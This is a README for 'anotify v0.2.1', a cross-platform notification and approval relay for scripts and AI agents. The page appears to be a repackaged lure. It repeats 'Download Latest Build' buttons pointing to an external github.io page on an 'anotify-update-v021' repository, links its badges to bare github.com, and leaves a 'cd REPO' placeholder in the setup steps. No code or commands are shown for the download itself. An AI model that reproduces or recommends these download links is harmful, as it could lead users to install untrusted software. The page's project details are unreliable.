# anotify v0.2.1 - cross-platform notification and approval workflow tool 2026

> **Anotify provides a cross-platform notification layer for AI agents, remote jobs, and approval flows, with desktop inbox updates and request-driven approvals in version 0.2.1.**

[![Platform](https://img.shields.io/badge/Platform-Windows,%20macOS,%20Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.2.1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tomwest1989/anotify-update-v021?style=flat-square)](https://github.com/tomwest1989/anotify-update-v021)

---

<p align="center">
  <a href="https://tomwest1989.github.io/anotify-update-v021/">
    <img src="https://img.shields.io/badge/Download-anotify%20Latest-brightgreen?style=for-the-badge" alt="Download anotify">
  </a>
</p>

> **[Download Latest Build - anotify v0.2.1](https://tomwest1989.github.io/anotify-update-v021/)**

---

[Download Latest Build](https://tomwest1989.github.io/anotify-update-v021/)

---

## What anotify does

anotify is intended to take status changes, approval prompts, and other important events from scripts or services and deliver them into a desktop-oriented workflow. It fits cases where automation needs a human answer, or where a running process should expose results without forcing you to tail logs constantly.

The stack pairs a self-hosted relay with a Tauri desktop client, so it works for local setups as well as outbound-only remote systems. On the service side it uses Python and FastAPI, and with WebSocket support for live delivery, anotify links automation, agents, and people through a straightforward notification inbox.

---

## Key capabilities

- Send job outputs, errors, and messages from scripts, CI pipelines, and AI agents
- Ask for approval and pause execution until a desktop response is received
- Run a self-hosted relay with REST and WebSocket endpoints
- Read updates inside a Tauri desktop app with a live inbox
- Show tray notifications for fresh events and approval prompts
- Support outbound-only remote hosts without opening inbound access
- Use token-based authentication for relay and client access
- Operate on Windows, macOS, and Linux with compatible desktop builds

---

## Getting started

Clone the repository and install the part you plan to run:

1. Download or clone the project
2. Set up the relay and/or desktop client for your environment
3. Start the service, then open the desktop app or point your scripts at the relay

Example:

    git clone https://github.com/tomwest1989/anotify-update-v021.git
    cd REPO

For a local launch, bring up the relay first, then start the desktop client so it can attach to the inbox and notification stream.

---

## How to use it

anotify is useful any time a script, job runner, or agent needs to report progress or ask for a decision.

Typical flow:

1. Start the relay service
2. Configure your client or script with the relay address and token
3. Send a message or status update
4. For approvals, create a request and wait for a response
5. Review incoming items in the desktop inbox or via tray alerts

Example workflow:

- A CI job finishes and posts the result
- A remote task requests approval before continuing
- The desktop client receives the request
- A user approves or rejects the action
- The waiting process resumes with the response

---

## Configuration

Most settings are supplied during setup through the relay, client, and authentication values you provide. Common configuration items include the relay URL, access token, and any local client preferences for inbox behavior or notifications.

Example:

    relay_url = "http://localhost:8000"
    token = "your-token-here"
    desktop_notifications = true

If you connect from a remote machine, keep the relay reachable through your chosen deployment method and make sure the client uses the same authentication details.

---

## Requirements

- Windows, macOS, or Linux
- A compatible desktop environment for the Tauri client
- Python for relay and CLI workflows
- FastAPI and WebSocket-capable service runtime
- Network access between clients and the relay
- Storage for inbox state, logs, and local client data

---

## FAQ

**How is anotify used?**  
It is used to bring notifications and approval requests from automation into a desktop workflow.

**Can I run it on a remote host?**  
Yes. The relay supports outbound-only remote host use cases.

**Does it support live updates?**  
Yes. WebSocket support is included for real-time communication.

**Where do I change settings?**  
Set the relay, token, and client behavior during setup, then tune local preferences in the desktop app or service configuration.

**What should I do if messages are not arriving?**  
Verify that the relay is running, the token matches, the client can reach the server, and your network path allows the connection.

**How do I get updates?**  
Watch the repository release activity and use the download link above for the latest build.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
